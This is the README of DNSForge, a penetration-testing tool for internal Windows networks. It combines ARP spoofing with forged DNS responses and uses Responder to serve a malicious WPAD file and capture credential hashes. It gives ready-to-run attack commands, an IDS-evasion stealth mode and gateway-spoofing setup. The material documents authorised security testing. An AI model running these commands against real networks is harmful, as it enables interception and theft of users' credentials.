# DNSForge
DNSForge is a network pentesting tool for responding to name resolution requests made to the authoritative DNS server in an internal network landscape, achieving interception and reuse of system credentials without user interaction. This tool is intended to be used alongside [Responder](https://github.com/lgandx/Responder). The original blog post for DNSForge can be found [here](https://aon.com/cyberlabs/dnsforge)

## Attack Customization
One of 2 attack modes must be specified when using DNSForge:

### Relay (Preferred)
In this mode, the tool expects the spoofing target (specified with `-t` or `-tf`) to be set to the victim client(s) (ex. employee/user workstation/laptop). This will cause the interception of packets on their way in from the authoritative nameserver to the victim clients and DNSForge will relay the server's DNS response while forging/poisoning the attacker's IP (specified with `-p`).
```bash
sudo dnsforge relay -i <interface> -p <attacker IP> -t <victim client> -q wpad
```

### Respond
In this mode, the tool expects the spoofing target (specified with `-t` or `-tf`) to be set to the authoritative nameserver (ex. DNS server/Domain Controller). This will cause interception of packets on their way out from the victim clients to the server and DNSForge will adequately respond to the client's DNS request while forging/poisoning the attacker's IP (specified with `-p`).
```bash
sudo dnsforge respond -i <interface> -p <attacker IP> -t <DNS server/domain controller> -q wpad
```

### Stealth (optional)
This option (`-s`) can be applied to both Relay and Respond attack modes. When applied, this option requests the SOA record from the authoritative DNS server and appends it to forged DNS responses for added stealth on networks with IDS/IPS devices. With this mode enabled, the tool produces DNS response messages that exactly match those generated from the authoritative DNS server.
```bash
sudo dnsforge relay -i <interface> -p <attacker IP> -t <victim client> -q wpad -s -ds <DNS server IP> -d <domain name>
```

## Installation
The tool can be installed using [pipx](https://github.com/pypa/pipx)
```bash
pipx install git+https://github.com/AonCyberLabs/DNSForge
```

Alternatively, the tool can be installed using [Poetry](https://python-poetry.org/) after cloning the repo.
```bash
poetry install
poetry shell
```

## Attack Scenario
This tool lends itself in the context of an internal network that consists of Windows workstations and servers. DNSForge utilizes ARP spoofing to redirect DNS requests intended for the DNS server to the attacker's host (when running in respond mode). Upon receiving DNS requests, DNSForge poisons the response with the attacker's IP address and, if in stealth mode configuration, forges the DNS server's SOA record. This induces victims to accept DNS responses from a seemingly legitimate source and performs an adversary-in-the-middle attack. Subsequently, Responder can be run to serve a malicious PAC file and capture hashes.

### Example
Sample scenario of poisoning DNS requests for WPAD issued by victim host:
1. Setup DNS Forge to poison incoming requests:
```sudo dnsforge relay -i <interface> -p <attacker IP> -t <victim client> -q wpad```
2. Finally, run Responder to serve malicious WPAD file and capture hashes:
```sudo responder -I <interface> -P```

## ARP Spoofing
The tool can be supplied either a target IP with `-t`, a file with target IPs with `-tf` or the `--no-arp-spoof` flag that turns off ARP spoofing and lets the user decide the method of redirecting DNS packets to the attacker's host. At least one of these options must be supplied.

### Spoofing Gateway (Respond mode)
In scenarios where the authoritative nameserver does not reside on the same subnet as the attacking host, DNSForge can be configured to perform ARP spoofing against the subnet gateway (either by explicitly supplying the gateway IP as a spoofing target or automatically when a target IP outside the selected interface's subnet is supplied). Since this action can perform denial-of-service against victim clients on the same subnet, DNSForge performs additional checks to verify if IP forwarding is enabled on the attacking host. IP forwarding will ensure that the attacking host acts as the gateway itself and mantains network reliability by forwarding incoming packets to the subnet's gateway IP.

The following command enables IP forwarding on Linux systems: `sudo sysctl -w net.ipv4.ip_forward=1`

Additionally, along with IP forwarding, the following iptables rule is recommended to ensure that only non-DNS traffic is forwarded: `sudo iptables -A FORWARD -i <Interface> -p udp --dport 53 -j DROP`

Alternatively, if the authoritative nameserver resides on a different subnet, consider utilizing the `relay` mode which intercepts DNS responses on their way from the legitimate server to the victim client.

## Usage
```
 ______   ____  _____   ______   ________
|_   _ `.|_   \|_   _|.' ____ \ |_   __  |
  | | `. \ |   \ | |  | (___ \_|  | |_ \_|.--.   _ .--.  .--./) .---.
  | |  | | | |\ \| |   _.____`.   |  _| / .'`\ \[ `/'`\]/ /'`\;/ /__\\
 _| |_.' /_| |_\   |_ | \____) | _| |_  | \__. | | |    \ \._//| \__.,
|______.'|_____|\____| \______.'|_____|  '.__.' [___]   .',__`  '.__.'
                                                       ( ( __))
Author : Apurva Goenka
Version : 1.0.0

usage: dnsforge [-h] -i INTERFACE -p POISON_IP [-ttl TIME_TO_LIVE] [-q QUERY_NAME] [-s] [-v]
                [-ds DNS_SERVER] [-d DOMAIN] (-t TARGET | -tf TARGET_FILE | --no-arp-spoof)
                {respond,relay}

DNS Response Forger

positional arguments:
  {respond,relay}       Respond mode: DNS request packets are intercepted on their way from the
                        client to the server. Relay mode: DNS response packets are intercepted on
                        their way from the server to the client.

options:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Interface to sniff/poison on
  -p POISON_IP, --poison-ip POISON_IP
                        IP address to forge/poison DNS response
  -ttl TIME_TO_LIVE, --time-to-live TIME_TO_LIVE
                        TTL (seconds) for poisoned DNS response
  -q QUERY_NAME, --query-name QUERY_NAME
                        DNS Query Name to Poison (can specify multiple by separating with ',')
  -s, --stealth         Stealth Mode
  -v, --verbose         Verbose Output

Stealth Mode:
  -ds DNS_SERVER, --dns-server DNS_SERVER
                        IP address of Authoritative DNS Server
  -d DOMAIN, --domain DOMAIN
                        The domain name of the victim domain

ARP Spoofing:
  -t TARGET, --target TARGET
                        ARP spoofing target IP
  -tf TARGET_FILE, --target-file TARGET_FILE
                        ARP spoofing target IP list
  --no-arp-spoof        Turn off ARP spoofing
```

### Copyright
Copyright 2025 Aon plc
